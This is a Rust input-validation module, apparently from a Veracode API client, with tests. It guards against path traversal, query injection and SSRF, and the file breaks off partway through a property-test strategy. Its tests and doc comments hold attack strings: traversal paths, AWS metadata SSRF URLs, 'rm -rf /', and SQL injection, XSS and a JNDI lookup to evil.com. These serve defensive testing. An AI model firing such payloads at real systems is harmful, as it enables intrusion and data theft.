//! Input validation types and utilities for defensive programming.
//!
//! This module provides validated wrapper types that ensure data meets
//! security and business requirements before being used in API operations.

use serde::{Deserialize, Serialize};
use std::fmt;
use std::sync::OnceLock;
use thiserror::Error;
use url::Url;
use urlencoding::encode;

/// Maximum length for application names
pub const MAX_APP_NAME_LEN: usize = 255;

/// Maximum length for application descriptions
pub const MAX_DESCRIPTION_LEN: usize = 4096;

/// Maximum length for business unit names
pub const MAX_BUSINESS_UNIT_NAME_LEN: usize = 255;

/// Maximum number of teams per application
pub const MAX_TEAMS_COUNT: usize = 100;

/// Maximum number of custom fields
pub const MAX_CUSTOM_FIELDS_COUNT: usize = 50;

/// Maximum length for tag values
pub const MAX_TAG_VALUE_LEN: usize = 128;

/// Maximum GUID length
pub const MAX_GUID_LEN: usize = 128;

/// Maximum scan ID length
pub const MAX_SCAN_ID_LEN: usize = 128;

/// Default page size for pagination
pub const DEFAULT_PAGE_SIZE: u32 = 50;

/// Maximum page size for pagination
pub const MAX_PAGE_SIZE: u32 = 500;

/// Maximum page number for pagination
pub const MAX_PAGE_NUMBER: u32 = 10000;

/// Validation errors for input data
#[derive(Debug, Error)]
#[must_use = "Need to handle all error enum types."]
pub enum ValidationError {
    #[error("Application GUID cannot be empty")]
    EmptyGuid,

    #[error("Application GUID too long: {actual} chars (max: {max})")]
    GuidTooLong { actual: usize, max: usize },

    #[error("Invalid GUID format: {0}")]
    InvalidGuidFormat(String),

    #[error("Invalid characters in GUID (possible path traversal)")]
    InvalidCharactersInGuid,

    #[error("Application name cannot be empty")]
    EmptyApplicationName,

    #[error("Application name too long: {actual} chars (max: {max})")]
    ApplicationNameTooLong { actual: usize, max: usize },

    #[error("Invalid characters in application name")]
    InvalidCharactersInName,

    #[error("Suspicious pattern in application name (possible path traversal)")]
    SuspiciousNamePattern,

    #[error("Description too long: {actual} chars (max: {max})")]
    DescriptionTooLong { actual: usize, max: usize },

    #[error("Description contains null byte")]
    NullByteInDescription,

    #[error("Too many teams: {actual} (max: {max})")]
    TooManyTeams { actual: usize, max: usize },

    #[error("Too many custom fields: {actual} (max: {max})")]
    TooManyCustomFields { actual: usize, max: usize },

    #[error("Invalid page size: {0} (must be 1-{MAX_PAGE_SIZE})")]
    InvalidPageSize(u32),

    #[error("Page size too large: {0} (max: {MAX_PAGE_SIZE})")]
    PageSizeTooLarge(u32),

    #[error("Page number too large: {0} (max: {MAX_PAGE_NUMBER})")]
    PageNumberTooLarge(u32),

    #[error("Empty URL segment not allowed")]
    EmptySegment,

    #[error("URL segment too long: {actual} chars (max: {max})")]
    SegmentTooLong { actual: usize, max: usize },

    #[error("Invalid path characters (possible path traversal)")]
    InvalidPathCharacters,

    #[error("Control characters not allowed")]
    ControlCharactersNotAllowed,

    #[error("Query encoding failed: {0}")]
    QueryEncodingFailed(String),

    #[error("Invalid URL: {0}")]
    InvalidUrl(String),

    #[error("URL must be from veracode.com, veracode.eu, or veracode.us domain, got: {0}")]
    InvalidDomain(String),

    #[error("Only HTTPS URLs are allowed, got scheme: {0}")]
    InsecureScheme(String),

    #[error("Scan ID cannot be empty")]
    EmptyScanId,

    #[error("Scan ID too long: {actual} chars (max: {max})")]
    ScanIdTooLong { actual: usize, max: usize },

    #[error("Invalid characters in scan ID (only alphanumeric, hyphens, and underscores allowed)")]
    InvalidScanIdCharacters,
}

/// Validated application GUID - ensures format compliance and prevents injection
#[derive(Debug, Clone, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(transparent)]
pub struct AppGuid(String);

impl AppGuid {
    /// UUID v4 format pattern
    const VALID_GUID_PATTERN: &'static str =
        r"^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$";

    /// Returns a lazily-initialized compiled UUID regex.
    ///
    /// The regex is compiled only once at first use and cached for subsequent calls,
    /// preventing `DoS` attacks from repeated regex compilation in high-throughput scenarios.
    fn uuid_regex() -> &'static regex::Regex {
        static UUID_REGEX: OnceLock<regex::Regex> = OnceLock::new();
        #[allow(clippy::expect_used)] // Compile-time constant regex pattern, safe to expect
        UUID_REGEX.get_or_init(|| {
            regex::Regex::new(Self::VALID_GUID_PATTERN)
                .expect("VALID_GUID_PATTERN is a valid regex")
        })
    }

    /// Validates and constructs a new `AppGuid`
    ///
    /// # Errors
    ///
    /// Returns an error if the GUID is empty, exceeds maximum length, contains invalid
    /// characters, or doesn't match the expected UUID format.
    ///
    /// # Panics
    ///
    /// This function contains an `expect()` call on a compile-time constant regex pattern
    /// which should never panic in practice.
    pub fn new(guid: impl Into<String>) -> Result<Self, ValidationError> {
        let guid = guid.into();

        // Check not empty
        if guid.is_empty() {
            return Err(ValidationError::EmptyGuid);
        }

        // Check length bounds
        if guid.len() > MAX_GUID_LEN {
            return Err(ValidationError::GuidTooLong {
                actual: guid.len(),
                max: MAX_GUID_LEN,
            });
        }

        // Validate UUID format using cached compiled regex
        if !Self::uuid_regex().is_match(&guid) {
            return Err(ValidationError::InvalidGuidFormat(guid));
        }

        // Additional security: reject path separators and traversal sequences
        if guid.contains('/') || guid.contains('\\') || guid.contains("..") {
            return Err(ValidationError::InvalidCharactersInGuid);
        }

        Ok(Self(guid))
    }

    /// Get the GUID as a string slice
    #[must_use = "this method returns the inner value without modifying the type"]
    pub fn as_str(&self) -> &str {
        &self.0
    }

    /// Get URL-safe representation (for path segments)
    #[must_use = "this method returns the inner value without modifying the type"]
    pub fn as_url_safe(&self) -> &str {
        // UUIDs are already URL-safe (only contain [0-9a-fA-F-])
        &self.0
    }
}

impl fmt::Display for AppGuid {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(f, "{}", self.0)
    }
}

impl AsRef<str> for AppGuid {
    fn as_ref(&self) -> &str {
        &self.0
    }
}

/// Validated application name
#[derive(Debug, Clone, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(transparent)]
pub struct AppName(String);

impl AppName {
    ///
    /// # Errors
    ///
    /// Returns an error if validation fails due to invalid input parameters.
    /// Validates and constructs a new `AppName`
    ///
    /// # Errors
    ///
    /// Returns an error if validation fails due to invalid input parameters.
    pub fn new(name: impl Into<String>) -> Result<Self, ValidationError> {
        let name = name.into();

        // Trim and check not empty
        let trimmed = name.trim();
        if trimmed.is_empty() {
            return Err(ValidationError::EmptyApplicationName);
        }

        // Check length
        if trimmed.len() > MAX_APP_NAME_LEN {
            return Err(ValidationError::ApplicationNameTooLong {
                actual: trimmed.len(),
                max: MAX_APP_NAME_LEN,
            });
        }

        // Check for control characters
        if trimmed.chars().any(|c| c.is_control()) {
            return Err(ValidationError::InvalidCharactersInName);
        }

        // Reject names that look like path traversal attempts
        if trimmed.contains("..") || trimmed.contains('/') || trimmed.contains('\\') {
            return Err(ValidationError::SuspiciousNamePattern);
        }

        Ok(Self(trimmed.to_string()))
    }

    /// Get the name as a string slice
    #[must_use = "this method returns the inner value without modifying the type"]
    pub fn as_str(&self) -> &str {
        &self.0
    }
}

impl fmt::Display for AppName {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(f, "{}", self.0)
    }
}

impl AsRef<str> for AppName {
    fn as_ref(&self) -> &str {
        &self.0
    }
}

/// Validated description with length bounds
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(transparent)]
pub struct Description(String);

impl Description {
    /// Validates and constructs a new Description
    ///
    /// # Errors
    ///
    /// Returns an error if validation fails due to invalid input parameters.
    pub fn new(desc: impl Into<String>) -> Result<Self, ValidationError> {
        let desc = desc.into();

        // Check length
        if desc.len() > MAX_DESCRIPTION_LEN {
            return Err(ValidationError::DescriptionTooLong {
                actual: desc.len(),
                max: MAX_DESCRIPTION_LEN,
            });
        }

        // Reject descriptions with null bytes
        if desc.contains('\0') {
            return Err(ValidationError::NullByteInDescription);
        }

        Ok(Self(desc))
    }

    /// Get the description as a string slice
    #[must_use = "this method returns the inner value without modifying the type"]
    pub fn as_str(&self) -> &str {
        &self.0
    }
}

impl fmt::Display for Description {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(f, "{}", self.0)
    }
}

impl AsRef<str> for Description {
    fn as_ref(&self) -> &str {
        &self.0
    }
}

/// Validates a URL path segment to prevent injection
///
/// # Errors
///
/// Returns an error if validation fails due to invalid input parameters.
pub fn validate_url_segment(segment: &str, max_len: usize) -> Result<&str, ValidationError> {
    if segment.is_empty() {
        return Err(ValidationError::EmptySegment);
    }

    if segment.len() > max_len {
        return Err(ValidationError::SegmentTooLong {
            actual: segment.len(),
            max: max_len,
        });
    }

    // Reject path traversal sequences
    if segment.contains("..") || segment.contains('/') || segment.contains('\\') {
        return Err(ValidationError::InvalidPathCharacters);
    }

    // Reject control characters
    if segment.chars().any(|c| c.is_control()) {
        return Err(ValidationError::ControlCharactersNotAllowed);
    }

    Ok(segment)
}

/// Validates and normalizes a page size parameter.
///
/// This function ensures that page sizes are within safe bounds to prevent
/// resource exhaustion attacks.
///
/// # Behavior
///
/// - Returns `DEFAULT_PAGE_SIZE` if `None` is provided
/// - Rejects page size of 0
/// - Caps page size at `MAX_PAGE_SIZE` with warning log
/// - Returns the validated page size
///
/// # Returns
///
/// A `Result` containing the validated page size or a `ValidationError`.
///
/// # Security
///
///
/// # Errors
///
/// Returns an error if the API request fails, the resource is not found,
/// or authentication/authorization fails.
/// This function prevents `DoS` attacks from unbounded pagination requests.
///
/// # Examples
///
/// ```
/// use veracode_platform::validation::{validate_page_size, DEFAULT_PAGE_SIZE, MAX_PAGE_SIZE};
///
/// // Default when None
/// assert_eq!(validate_page_size(None).unwrap(), DEFAULT_PAGE_SIZE);
///
/// // Normal value passes through
/// assert_eq!(validate_page_size(Some(100)).unwrap(), 100);
///
/// // Zero is rejected
/// assert!(validate_page_size(Some(0)).is_err());
///
/// // Too large is capped (with warning log)
/// assert_eq!(validate_page_size(Some(10000)).unwrap(), MAX_PAGE_SIZE);
/// ```
///
/// # Errors
///
/// Returns an error if validation fails due to invalid input parameters.
pub fn validate_page_size(size: Option<u32>) -> Result<u32, ValidationError> {
    match size {
        None => Ok(DEFAULT_PAGE_SIZE),
        Some(0) => Err(ValidationError::InvalidPageSize(0)),
        Some(s) if s > MAX_PAGE_SIZE => {
            log::warn!(
                "Page size {} exceeds maximum {}, capping to maximum",
                s,
                MAX_PAGE_SIZE
            );
            Ok(MAX_PAGE_SIZE)
        }
        Some(s) => Ok(s),
    }
}

/// Validates and normalizes a page number parameter.
///
/// This function ensures that page numbers are within safe bounds to prevent
/// resource exhaustion attacks.
///
/// # Behavior
///
/// - Returns `None` if `None` is provided (use API default, typically 0)
/// - Caps page number at `MAX_PAGE_NUMBER` with warning log
/// - Returns the validated page number
///
/// # Returns
///
/// A `Result` containing the validated page number or a `ValidationError`.
///
/// # Security
///
///
/// # Errors
///
/// Returns an error if the API request fails, the resource is not found,
/// or authentication/authorization fails.
/// This function prevents `DoS` attacks from unbounded pagination requests.
///
/// # Examples
///
/// ```
/// use veracode_platform::validation::{validate_page_number, MAX_PAGE_NUMBER};
///
/// // None passes through
/// assert_eq!(validate_page_number(None).unwrap(), None);
///
/// // Normal value passes through
/// assert_eq!(validate_page_number(Some(10)).unwrap(), Some(10));
///
/// // Too large is capped (with warning log)
/// assert_eq!(validate_page_number(Some(99999)).unwrap(), Some(MAX_PAGE_NUMBER));
/// ```
///
/// # Errors
///
/// Returns an error if validation fails due to invalid input parameters.
pub fn validate_page_number(page: Option<u32>) -> Result<Option<u32>, ValidationError> {
    match page {
        None => Ok(None),
        Some(p) if p > MAX_PAGE_NUMBER => {
            log::warn!(
                "Page number {} exceeds maximum {}, capping to maximum",
                p,
                MAX_PAGE_NUMBER
            );
            Ok(Some(MAX_PAGE_NUMBER))
        }
        Some(p) => Ok(Some(p)),
    }
}

/// Encodes a query parameter value for safe use in URLs.
///
/// This function prevents query parameter injection attacks by properly
/// URL-encoding special characters that could be used to inject additional
/// parameters or manipulate the query string.
///
/// # Security
///
/// This function prevents injection attacks like:
/// - `"foo&admin=true"` → `"foo%26admin%3Dtrue"`
/// - `"test;rm -rf /"` → `"test%3Brm%20-rf%20%2F"`
///
/// # Examples
///
/// ```
/// use veracode_platform::validation::encode_query_param;
///
/// // Normal values pass through unchanged
/// assert_eq!(encode_query_param("MyApp"), "MyApp");
///
/// // Special characters are encoded
/// assert_eq!(encode_query_param("foo&bar"), "foo%26bar");
/// assert_eq!(encode_query_param("key=value"), "key%3Dvalue");
/// assert_eq!(encode_query_param("test;command"), "test%3Bcommand");
/// ```
#[must_use = "this function performs URL encoding and returns the encoded value"]
pub fn encode_query_param(value: &str) -> String {
    encode(value).into_owned()
}

/// Safely builds a query parameter tuple with URL encoding.
///
/// This is a convenience function for building query parameter tuples
/// with proper URL encoding applied to the value.
///
/// # Security
///
/// Prevents query parameter injection by encoding special characters.
///
/// # Examples
///
/// ```
/// use veracode_platform::validation::build_query_param;
///
/// let param = build_query_param("name", "My App & Co");
/// assert_eq!(param.0, "name");
/// assert_eq!(param.1, "My%20App%20%26%20Co");
/// ```
#[must_use = "this function builds and returns a query parameter tuple"]
pub fn build_query_param(key: &str, value: &str) -> (String, String) {
    (key.to_string(), encode_query_param(value))
}

/// Validates that a URL is from an allowed Veracode domain (SSRF protection).
///
/// This function prevents Server-Side Request Forgery (SSRF) attacks by validating
/// that URLs returned in API responses are from legitimate Veracode domains across
/// all supported regions (Commercial, European, Federal).
///
/// # Allowed Domains
///
/// - Commercial: `*.veracode.com` (api.veracode.com, analysiscenter.veracode.com)
/// - European: `*.veracode.eu` (api.veracode.eu, analysiscenter.veracode.eu)
/// - Federal: `*.veracode.us` (api.veracode.us, analysiscenter.veracode.us)
///
/// # Security
///
/// Without this validation, an attacker who compromises API responses could redirect
/// requests to:
/// - Internal services (AWS metadata endpoints, localhost services)
/// - Private network ranges (192.168.x.x, 10.x.x.x)
/// - External malicious servers to steal authentication headers
///
/// # Arguments
///
/// * `url_str` - The URL string to validate
///
/// # Returns
///
/// Returns `Ok(())` if the URL is valid and from an allowed Veracode domain.
///
/// # Errors
///
/// Returns `ValidationError::InvalidUrl` if the URL cannot be parsed.
/// Returns `ValidationError::InsecureScheme` if the URL is not HTTPS.
/// Returns `ValidationError::InvalidDomain` if the URL is not from a Veracode domain.
///
/// # Examples
///
/// ```
/// use veracode_platform::validation::validate_veracode_url;
///
/// // Valid Veracode URLs
/// assert!(validate_veracode_url("https://api.veracode.com/appsec/v1/applications").is_ok());
/// assert!(validate_veracode_url("https://api.veracode.eu/appsec/v1/applications").is_ok());
/// assert!(validate_veracode_url("https://api.veracode.us/appsec/v1/applications").is_ok());
///
/// // Invalid - not HTTPS
/// assert!(validate_veracode_url("http://api.veracode.com/test").is_err());
///
/// // Invalid - wrong domain (SSRF attempt)
/// assert!(validate_veracode_url("https://evil.com/test").is_err());
/// assert!(validate_veracode_url("https://localhost:8080/admin").is_err());
/// ```
pub fn validate_veracode_url(url_str: &str) -> Result<(), ValidationError> {
    // Parse the URL
    let parsed_url = Url::parse(url_str)
        .map_err(|e| ValidationError::InvalidUrl(format!("Failed to parse URL: {}", e)))?;

    // Only allow HTTPS (reject HTTP to prevent downgrade attacks)
    if parsed_url.scheme() != "https" {
        return Err(ValidationError::InsecureScheme(
            parsed_url.scheme().to_string(),
        ));
    }

    // Validate the host is from Veracode
    let host = parsed_url
        .host_str()
        .ok_or_else(|| ValidationError::InvalidUrl("URL missing host".to_string()))?;

    // Allow known Veracode domains across all regions:
    // - Commercial: *.veracode.com
    // - European: *.veracode.eu
    // - Federal: *.veracode.us
    let is_allowed = host.ends_with(".veracode.com")
        || host.ends_with(".veracode.eu")
        || host.ends_with(".veracode.us")
        || host == "api.veracode.com"
        || host == "api.veracode.eu"
        || host == "api.veracode.us"
        || host == "analysiscenter.veracode.com"
        || host == "analysiscenter.veracode.eu"
        || host == "analysiscenter.veracode.us";

    if !is_allowed {
        return Err(ValidationError::InvalidDomain(host.to_string()));
    }

    Ok(())
}

/// Validates a scan ID to prevent path traversal and injection attacks.
///
/// This function ensures that scan IDs used in URL construction are safe and
/// cannot be used for path traversal attacks or to access unauthorized resources.
///
/// # Security
///
/// Without this validation, an attacker could inject path traversal sequences:
/// - `"../../../admin/scans"` → Access admin endpoints
/// - `"abc?admin=true"` → Inject query parameters
/// - `"valid_id/../../other_id"` → Access other users' scans
///
/// # Allowed Characters
///
/// - Alphanumeric: `a-z`, `A-Z`, `0-9`
/// - Hyphens: `-`
/// - Underscores: `_`
///
/// # Arguments
///
/// * `scan_id` - The scan ID to validate
///
/// # Returns
///
/// Returns `Ok(())` if the scan ID is valid.
///
/// # Errors
///
/// Returns `ValidationError::EmptyScanId` if the scan ID is empty.
/// Returns `ValidationError::ScanIdTooLong` if the scan ID exceeds maximum length.
/// Returns `ValidationError::InvalidScanIdCharacters` if the scan ID contains invalid characters.
///
/// # Examples
///
/// ```
/// use veracode_platform::validation::validate_scan_id;
///
/// // Valid scan IDs
/// assert!(validate_scan_id("abc123").is_ok());
/// assert!(validate_scan_id("scan-id-123").is_ok());
/// assert!(validate_scan_id("SCAN_ID_456").is_ok());
///
/// // Invalid - path traversal
/// assert!(validate_scan_id("../admin").is_err());
///
/// // Invalid - special characters
/// assert!(validate_scan_id("scan?admin=true").is_err());
/// assert!(validate_scan_id("scan/path").is_err());
/// ```
pub fn validate_scan_id(scan_id: &str) -> Result<(), ValidationError> {
    // Check not empty
    if scan_id.is_empty() {
        return Err(ValidationError::EmptyScanId);
    }

    // Check length bounds
    if scan_id.len() > MAX_SCAN_ID_LEN {
        return Err(ValidationError::ScanIdTooLong {
            actual: scan_id.len(),
            max: MAX_SCAN_ID_LEN,
        });
    }

    // Only allow alphanumeric characters, hyphens, and underscores
    // This prevents path traversal (.., /, \) and injection attacks (?, &, =, etc.)
    if !scan_id
        .chars()
        .all(|c| c.is_alphanumeric() || c == '-' || c == '_')
    {
        return Err(ValidationError::InvalidScanIdCharacters);
    }

    Ok(())
}

#[cfg(test)]
#[allow(clippy::expect_used)]
mod tests {
    use super::*;

    #[test]
    fn test_app_guid_valid() {
        let guid =
            AppGuid::new("550e8400-e29b-41d4-a716-446655440000").expect("should create valid guid");
        assert_eq!(guid.as_str(), "550e8400-e29b-41d4-a716-446655440000");
    }

    #[test]
    fn test_app_guid_invalid_format() {
        assert!(AppGuid::new("not-a-guid").is_err());
        assert!(AppGuid::new("12345").is_err());
        assert!(AppGuid::new("").is_err());
    }

    #[test]
    fn test_app_guid_path_traversal() {
        assert!(AppGuid::new("../etc/passwd").is_err());
        assert!(AppGuid::new("550e8400/../test").is_err());
    }

    #[test]
    fn test_app_name_valid() {
        let name = AppName::new("My Application").expect("should create valid app name");
        assert_eq!(name.as_str(), "My Application");
    }

    #[test]
    fn test_app_name_trims_whitespace() {
        let name = AppName::new("  Trimmed  ").expect("should create valid app name");
        assert_eq!(name.as_str(), "Trimmed");
    }

    #[test]
    fn test_app_name_empty() {
        assert!(AppName::new("").is_err());
        assert!(AppName::new("   ").is_err());
    }

    #[test]
    fn test_app_name_too_long() {
        let long_name = "a".repeat(MAX_APP_NAME_LEN + 1);
        assert!(AppName::new(long_name).is_err());
    }

    #[test]
    fn test_app_name_path_traversal() {
        assert!(AppName::new("../etc/passwd").is_err());
        assert!(AppName::new("test/../admin").is_err());
        assert!(AppName::new("test/admin").is_err());
    }

    #[test]
    fn test_description_valid() {
        let desc = Description::new("This is a valid description")
            .expect("should create valid description");
        assert_eq!(desc.as_str(), "This is a valid description");
    }

    #[test]
    fn test_description_too_long() {
        let long_desc = "a".repeat(MAX_DESCRIPTION_LEN + 1);
        assert!(Description::new(long_desc).is_err());
    }

    #[test]
    fn test_description_null_byte() {
        assert!(Description::new("test\0null").is_err());
    }

    #[test]
    fn test_validate_url_segment() {
        assert!(validate_url_segment("valid-segment", 100).is_ok());
        assert!(validate_url_segment("", 100).is_err());
        assert!(validate_url_segment("../traversal", 100).is_err());
        assert!(validate_url_segment("test/path", 100).is_err());
    }

    #[test]
    fn test_validate_page_size_default() {
        let result = validate_page_size(None).expect("should return default");
        assert_eq!(result, DEFAULT_PAGE_SIZE);
    }

    #[test]
    fn test_validate_page_size_valid() {
        let result = validate_page_size(Some(100)).expect("should accept valid size");
        assert_eq!(result, 100);

        let result = validate_page_size(Some(MAX_PAGE_SIZE)).expect("should accept max size");
        assert_eq!(result, MAX_PAGE_SIZE);
    }

    #[test]
    fn test_validate_page_size_zero() {
        let result = validate_page_size(Some(0));
        assert!(result.is_err());
        assert!(matches!(result, Err(ValidationError::InvalidPageSize(0))));
    }

    #[test]
    fn test_validate_page_size_too_large() {
        let result = validate_page_size(Some(1000)).expect("should cap to max");
        assert_eq!(result, MAX_PAGE_SIZE);

        let result = validate_page_size(Some(u32::MAX)).expect("should cap to max");
        assert_eq!(result, MAX_PAGE_SIZE);
    }

    #[test]
    fn test_validate_page_number_none() {
        let result = validate_page_number(None).expect("should accept None");
        assert_eq!(result, None);
    }

    #[test]
    fn test_validate_page_number_valid() {
        let result = validate_page_number(Some(10)).expect("should accept valid page");
        assert_eq!(result, Some(10));

        let result = validate_page_number(Some(MAX_PAGE_NUMBER)).expect("should accept max page");
        assert_eq!(result, Some(MAX_PAGE_NUMBER));
    }

    #[test]
    fn test_validate_page_number_too_large() {
        let result = validate_page_number(Some(50000)).expect("should cap to max");
        assert_eq!(result, Some(MAX_PAGE_NUMBER));

        let result = validate_page_number(Some(u32::MAX)).expect("should cap to max");
        assert_eq!(result, Some(MAX_PAGE_NUMBER));
    }

    #[test]
    fn test_encode_query_param_normal() {
        assert_eq!(encode_query_param("MyApp"), "MyApp");
        assert_eq!(encode_query_param("test-app"), "test-app");
        assert_eq!(encode_query_param("app_123"), "app_123");
    }

    #[test]
    fn test_encode_query_param_injection_attempts() {
        // Test ampersand injection
        assert_eq!(encode_query_param("foo&admin=true"), "foo%26admin%3Dtrue");

        // Test equals sign injection
        assert_eq!(encode_query_param("key=value"), "key%3Dvalue");

        // Test semicolon injection
        assert_eq!(encode_query_param("test;command"), "test%3Bcommand");

        // Test percent sign (double encoding protection)
        assert_eq!(encode_query_param("50%off"), "50%25off");

        // Test space
        assert_eq!(encode_query_param("My App"), "My%20App");

        // Test multiple special characters
        assert_eq!(
            encode_query_param("foo&bar=baz;test%data"),
            "foo%26bar%3Dbaz%3Btest%25data"
        );
    }

    #[test]
    fn test_encode_query_param_path_traversal() {
        assert_eq!(encode_query_param("../etc/passwd"), "..%2Fetc%2Fpasswd");
        assert_eq!(encode_query_param("..\\windows"), "..%5Cwindows");
    }

    #[test]
    fn test_build_query_param() {
        let param = build_query_param("name", "MyApp");
        assert_eq!(param.0, "name");
        assert_eq!(param.1, "MyApp");

        let param = build_query_param("name", "My App & Co");
        assert_eq!(param.0, "name");
        assert_eq!(param.1, "My%20App%20%26%20Co");

        let param = build_query_param("filter", "status=active");
        assert_eq!(param.0, "filter");
        assert_eq!(param.1, "status%3Dactive");
    }

    #[test]
    fn test_validate_veracode_url_commercial() {
        assert!(validate_veracode_url("https://api.veracode.com/appsec/v1/applications").is_ok());
        assert!(
            validate_veracode_url("https://analysiscenter.veracode.com/api/5.0/getapplist.do")
                .is_ok()
        );
    }

    #[test]
    fn test_validate_veracode_url_european() {
        assert!(validate_veracode_url("https://api.veracode.eu/appsec/v1/applications").is_ok());
        assert!(
            validate_veracode_url("https://analysiscenter.veracode.eu/api/5.0/getapplist.do")
                .is_ok()
        );
    }

    #[test]
    fn test_validate_veracode_url_federal() {
        assert!(validate_veracode_url("https://api.veracode.us/appsec/v1/applications").is_ok());
        assert!(
            validate_veracode_url("https://analysiscenter.veracode.us/api/5.0/getapplist.do")
                .is_ok()
        );
    }

    #[test]
    fn test_validate_veracode_url_subdomain() {
        // Allow subdomains like pipeline.veracode.com
        assert!(validate_veracode_url("https://pipeline.veracode.com/v1/scan").is_ok());
        assert!(validate_veracode_url("https://results.veracode.eu/report").is_ok());
    }

    #[test]
    fn test_validate_veracode_url_reject_http() {
        let result = validate_veracode_url("http://api.veracode.com/test");
        assert!(result.is_err());
        assert!(matches!(result, Err(ValidationError::InsecureScheme(_))));
    }

    #[test]
    fn test_validate_veracode_url_reject_wrong_domain() {
        // SSRF attempt - external domain
        let result = validate_veracode_url("https://evil.com/test");
        assert!(result.is_err());
        assert!(matches!(result, Err(ValidationError::InvalidDomain(_))));

        // SSRF attempt - localhost
        let result = validate_veracode_url("https://localhost:8080/admin");
        assert!(result.is_err());
        assert!(matches!(result, Err(ValidationError::InvalidDomain(_))));

        // SSRF attempt - internal IP
        let result = validate_veracode_url("https://192.168.1.1/admin");
        assert!(result.is_err());
        assert!(matches!(result, Err(ValidationError::InvalidDomain(_))));

        // SSRF attempt - AWS metadata
        let result = validate_veracode_url("https://169.254.169.254/latest/meta-data/");
        assert!(result.is_err());
        assert!(matches!(result, Err(ValidationError::InvalidDomain(_))));
    }

    #[test]
    fn test_validate_veracode_url_reject_similar_domain() {
        // Typosquatting attempt
        let result = validate_veracode_url("https://api.veracode.com.evil.com/test");
        assert!(result.is_err());
        assert!(matches!(result, Err(ValidationError::InvalidDomain(_))));

        // Wrong TLD
        let result = validate_veracode_url("https://api.veracode.org/test");
        assert!(result.is_err());
        assert!(matches!(result, Err(ValidationError::InvalidDomain(_))));
    }

    #[test]
    fn test_validate_veracode_url_invalid_format() {
        let result = validate_veracode_url("not-a-url");
        assert!(result.is_err());
        assert!(matches!(result, Err(ValidationError::InvalidUrl(_))));

        let result = validate_veracode_url("");
        assert!(result.is_err());
        assert!(matches!(result, Err(ValidationError::InvalidUrl(_))));
    }

    #[test]
    fn test_validate_scan_id_valid() {
        assert!(validate_scan_id("abc123").is_ok());
        assert!(validate_scan_id("scan-id-123").is_ok());
        assert!(validate_scan_id("SCAN_ID_456").is_ok());
        assert!(validate_scan_id("a1b2c3-d4e5-f6").is_ok());
        assert!(validate_scan_id("123456789").is_ok());
        assert!(validate_scan_id("test_scan_123").is_ok());
    }

    #[test]
    fn test_validate_scan_id_empty() {
        let result = validate_scan_id("");
        assert!(result.is_err());
        assert!(matches!(result, Err(ValidationError::EmptyScanId)));
    }

    #[test]
    fn test_validate_scan_id_too_long() {
        let long_id = "a".repeat(MAX_SCAN_ID_LEN + 1);
        let result = validate_scan_id(&long_id);
        assert!(result.is_err());
        assert!(matches!(result, Err(ValidationError::ScanIdTooLong { .. })));
    }

    #[test]
    fn test_validate_scan_id_path_traversal() {
        // Path traversal with ..
        let result = validate_scan_id("../admin");
        assert!(result.is_err());
        assert!(matches!(
            result,
            Err(ValidationError::InvalidScanIdCharacters)
        ));

        let result = validate_scan_id("scan/../other");
        assert!(result.is_err());
        assert!(matches!(
            result,
            Err(ValidationError::InvalidScanIdCharacters)
        ));

        // Path separator /
        let result = validate_scan_id("scan/path");
        assert!(result.is_err());
        assert!(matches!(
            result,
            Err(ValidationError::InvalidScanIdCharacters)
        ));

        // Path separator \
        let result = validate_scan_id("scan\\path");
        assert!(result.is_err());
        assert!(matches!(
            result,
            Err(ValidationError::InvalidScanIdCharacters)
        ));
    }

    #[test]
    fn test_validate_scan_id_injection_attempts() {
        // Query string injection
        let result = validate_scan_id("scan?admin=true");
        assert!(result.is_err());
        assert!(matches!(
            result,
            Err(ValidationError::InvalidScanIdCharacters)
        ));

        // Ampersand injection
        let result = validate_scan_id("scan&param=value");
        assert!(result.is_err());
        assert!(matches!(
            result,
            Err(ValidationError::InvalidScanIdCharacters)
        ));

        // Equals sign injection
        let result = validate_scan_id("scan=admin");
        assert!(result.is_err());
        assert!(matches!(
            result,
            Err(ValidationError::InvalidScanIdCharacters)
        ));

        // Semicolon injection
        let result = validate_scan_id("scan;drop table");
        assert!(result.is_err());
        assert!(matches!(
            result,
            Err(ValidationError::InvalidScanIdCharacters)
        ));

        // Space
        let result = validate_scan_id("scan id");
        assert!(result.is_err());
        assert!(matches!(
            result,
            Err(ValidationError::InvalidScanIdCharacters)
        ));

        // Special characters
        let result = validate_scan_id("scan@host");
        assert!(result.is_err());
        assert!(matches!(
            result,
            Err(ValidationError::InvalidScanIdCharacters)
        ));

        let result = validate_scan_id("scan#fragment");
        assert!(result.is_err());
        assert!(matches!(
            result,
            Err(ValidationError::InvalidScanIdCharacters)
        ));
    }

    #[test]
    fn test_validate_scan_id_max_length() {
        // Exactly at max length should pass
        let max_id = "a".repeat(MAX_SCAN_ID_LEN);
        assert!(validate_scan_id(&max_id).is_ok());
    }
}

// Property-based security tests for validation functions
#[cfg(test)]
mod proptest_security {
    use super::*;
    use proptest::prelude::*;

    // Strategy for generating valid UUID v4 GUIDs
    fn valid_uuid_strategy() -> impl Strategy<Value = String> {
        // Generate valid UUIDs: 8-4-4-4-12 hex digits with hyphens
        "[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}"
    }

    // Strategy for generating path traversal sequences
    fn path_traversal_strategy() -> impl Strategy<Value = String> {
        prop_oneof![
            Just("../".to_string()),
            Just("..\\".to_string()),
            Just("../../".to_string()),
            Just("..\\..\\".to_string()),
            Just("/etc/passwd".to_string()),
            Just("\\windows\\system32".to_string()),
            Just("....//".to_string()),
            Just("..;/".to_string()),
        ]
    }

    // Strategy for generating injection attack strings
    fn injection_strategy() -> impl Strategy<Value = String> {
        prop_oneof![
            Just("'; DROP TABLE users--".to_string()),
            Just("<script>alert('xss')</script>".to_string()),
            Just("${jndi:ldap://evil.com/a}".to_string()),
            Just("{{7*7}}".to_string()),
            Just("%0a%0d".to_string()),
            Just("\0null\0byte".to_string()),
            Just("admin' OR '1'='1".to_string()),
            Just("&admin=true".to_string()),
            Just("?param=value".to_string()),
